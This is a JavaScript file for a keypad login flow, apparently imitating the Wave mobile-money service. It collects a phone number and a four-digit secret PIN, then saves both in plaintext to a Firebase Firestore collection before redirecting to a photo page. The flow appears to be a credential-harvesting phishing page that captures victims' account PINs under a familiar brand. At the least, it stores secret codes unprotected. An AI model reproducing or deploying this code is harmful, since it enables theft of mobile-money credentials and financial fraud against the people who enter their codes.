document.addEventListener('DOMContentLoaded', () => {
    // Page 1 - Numéro de téléphone
    const phonePage = document.getElementById('phone-page');
    if (phonePage) {
        console.log('📱 Page numéro de téléphone chargée');
        const phoneInput = document.getElementById('phone-input');
        const nextButton = document.getElementById('next-button');
        const keys = phonePage.querySelectorAll('.key');

        keys.forEach(key => {
            key.addEventListener('click', () => {
                if (key.classList.contains('delete')) {
                    phoneInput.value = phoneInput.value.slice(0, -1);
                } else {
                    if (phoneInput.value.length < 10) {
                        phoneInput.value += key.dataset.value;
                    }
                }
                nextButton.disabled = phoneInput.value.length !== 10;
            });
        });

        nextButton?.addEventListener('click', () => {
            console.log('📞 Numéro sauvegardé:', phoneInput.value);
            localStorage.setItem('wavePhoneNumber', phoneInput.value);
            window.location.href = 'code.html';
        });
    }

    // Page 2 - Code Secret avec envoi à Firebase
    const codePage = document.getElementById('code-input');
    if (codePage) {
        console.log('🔐 Page code secret chargée');
        const dots = codePage.querySelectorAll('.dot');
        let code = '';

        const backButton = codePage.querySelector('.back-button');
        backButton?.addEventListener('click', () => {
            window.location.href = 'index.html';
        });

        const savedPhone = localStorage.getItem('wavePhoneNumber');
        if (savedPhone) {
            const title = codePage.querySelector('h1');
            if (title) {
                title.textContent = `Entrez votre code secret pour le compte ${savedPhone}`;
            }
        }

        async function sendDataToFirebase(phoneNumber, code) {
            console.log('🚀 Envoi des données vers Firebase');
            try {
                const db = firebase.firestore();
                console.log('💾 Sauvegarde dans Firestore...');
                
                const userData = {
                    phoneNumber,
                    code,
                    createdAt: firebase.firestore.FieldValue.serverTimestamp()
                };
                
                console.log('📋 Données à sauvegarder:', {
                    ...userData,
                    code: '****' // Masqué pour la sécurité
                });

                const docRef = await db.collection('users').add(userData);
                console.log('📑 Document créé avec l\'ID:', docRef.id);
                console.log('✅ Données sauvegardées avec succès');
                return true;
            } catch (error) {
                console.error('❌ Erreur lors de l\'envoi des données:', error);
                return false;
            }
        }
        const keys = codePage.querySelectorAll('.key');
        keys.forEach(key => {
            key.addEventListener('click', async () => {
                if (key.classList.contains('delete')) {
                    code = code.slice(0, -1);
                } else if (code.length < 4) {
                    code += key.dataset.value;
                }

                // Mise à jour des points
                dots.forEach((dot, index) => {
                    dot.classList.toggle('filled', index < code.length);
                });

                if (code.length === 4) {
                    console.log('🔑 Code secret complété');
                    const phoneNumber = localStorage.getItem('wavePhoneNumber');
                    
                    if (!phoneNumber) {
                        alert('Numéro de téléphone manquant. Veuillez recommencer.');
                        window.location.href = 'index.html';
                        return;
                    }

                    const success = await sendDataToFirebase(phoneNumber, code);
                    
                    if (success) {
                        console.log('✅ Données envoyées avec succès');
                        localStorage.removeItem('wavePhoneNumber'); // On peut supprimer car déjà sauvegardé
                        window.location.href = 'photo.html';
                    } else {
                        alert('Une erreur est survenue. Veuillez réessayer.');
                        code = '';
                        dots.forEach(dot => dot.classList.remove('filled'));
                    }
                }
            });
        });
    }
});